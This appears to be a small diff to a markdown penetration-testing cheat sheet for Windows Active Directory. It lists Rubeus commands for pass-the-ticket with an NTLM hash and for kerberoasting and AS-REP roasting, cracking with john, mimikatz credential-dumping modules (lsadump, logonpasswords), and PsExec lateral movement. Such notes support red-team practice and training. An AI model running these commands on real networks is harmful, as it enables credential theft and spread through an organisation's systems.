@@ -85,14 +85,15 @@ You may already have a shell!
 
 ```Rubeus.exe asktgt /domain:$DOMAIN /user:$DOMAIN_USER /rc4:$NTLM_HASH /ptt```
 
+### roasting
+
 ```Rubeus.exe kerberoast/asreproast```
 
 ```john hash.txt```
 
-#### kerberoast
-
 #### mimikatz
-
+lsadump
+logonpasswords
 
 #### Lat Move
 ```PsExec.exe -accepteula \\$HOSTNAME cmd```
